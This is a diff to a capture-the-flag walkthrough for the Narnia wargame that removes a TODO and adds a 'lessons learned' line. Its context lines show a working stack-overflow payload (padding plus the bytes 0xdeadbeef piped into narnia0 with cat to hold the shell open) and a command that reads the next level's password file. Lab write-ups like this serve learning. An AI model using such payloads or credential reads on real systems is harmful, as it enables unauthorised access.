@@ -46,8 +46,6 @@ can be fixed by piping multiple commands into the application:
     (python -c "print(20*'a' + chr(0xef) + chr(0xbe) + chr(0xad) + chr(0xde))"; cat)
         | ./narnia0
 
-%TODO: find a good source for this...
-
 With the command ``whoami'' we can check, if everything worked:
     whoami
     -> narnia1
@@ -56,6 +54,9 @@ Fine, seems like it worked! Now we cat the password for the next level
 
     cat /etc/narnia_pass/narnia1
 
+### Lessons learned:
+
+Use ``cat'' to pass the input into the opened shell.
 
 
 ## Level 1:
